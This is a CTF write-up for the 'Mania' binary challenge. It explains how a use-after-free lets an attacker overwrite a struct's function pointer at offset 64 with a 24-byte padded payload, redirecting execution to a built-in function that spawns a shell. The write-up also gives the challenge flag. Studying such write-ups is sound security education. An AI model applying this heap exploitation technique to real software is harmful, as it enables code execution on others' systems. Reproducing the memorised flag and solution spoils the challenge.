# Mania

## Description

Poor Joe has been doing binary exploitation challenges for too long and has gone mad. Can you help him re-adapt to society and have a real conversation?

```text
nc 0agn86asl3d2.boroctf.com 44996
```

## Solution Walkthrough

1. **Step 1**:

    The program's two structs are the same size and use free(), so it is likely a UAF vulnerability.

    Additionally, PIE is disabled, so we can directly utilize function addresses.

    Let's look at the program:

    ```c
    struct imaginaryFriend {
        double rating;              // 8 bytes
        char title[32];             // offset 8
        char special_ability[32];   // offset 40
    };

    struct realPerson {
        char firstName[32];         // offset 0
        char lastName[32];          // offset 32
        void (*conversate)();       // offset 64
    };
    ```

    As we can see, the program struct sizes are identical, so it is highly likely they will use the same heap chunk.

    `realPerson` contains a function pointer:

    ```c
    void (*conversate)();
    ```

    When a real person is normally created, it is set to:

    ```c
    friend->conversate = realConversation;
    ```

    And during interaction, it is called directly:

    ```c
    RF->conversate();
    ```

    If we can overwrite this function pointer, we can control the program flow.

2. **Step 2**:

    The `Ghost person` option in the menu calls free(RF):

    ```c
    case '4':
        free(RF);
        break;
    ```

    However, it does not set RF back to NULL, so RF still points to the original heap chunk, resulting in a UAF condition.

    Next, if we select `Imagine friend`, because `imaginaryFriend` and `realPerson` are the same size, malloc() will likely reuse the chunk that was just freed.

    Therefore, we can overwrite the content of `realPerson` that the dangling pointer `RF` sees by filling in the data for `imaginaryFriend`.

3. **Step 3**:

    The function pointer `conversate` in realPerson is at offset 64:

    ```text
    firstName[32] + lastName[32] = 64
    ```

    The `special_ability` in imaginaryFriend is at offset 40:

    ```text
    rating[8] + title[32] = 40
    ```

    Therefore, to overwrite from `special_ability` to `conversate`, we need:

    ```text
    64 - 40 = 24 bytes
    ```

    Payload:

    ```python
    b"A" * 24 + p64(idealConversation)
    ```

    This allows us to change `RF->conversate` to `idealConversation`.

4. **Step 4**:

    Using nm, we can see:

    ```bash
    nm -n chal | grep Conversation
    ```

    Result:

    ```text
    0000000000401717 T realConversation
    0000000000401731 T idealConversation
    ```

    So the target address is:

    ```python
    idealConversation = 0x401731
    ```

    `idealConversation()` content:

    ```c
    void idealConversation() {
        puts("Wow! You made a real connection!");
        system("/bin/sh");
    }
    ```

    Therefore, as long as we reach `idealConversation()`, we can obtain a shell.

5. **Step 5**:

    Write the script based on the steps above to get the flag.

## Flag

```text
boroCTF{tw0s_c0mpl3men+_M3}
```
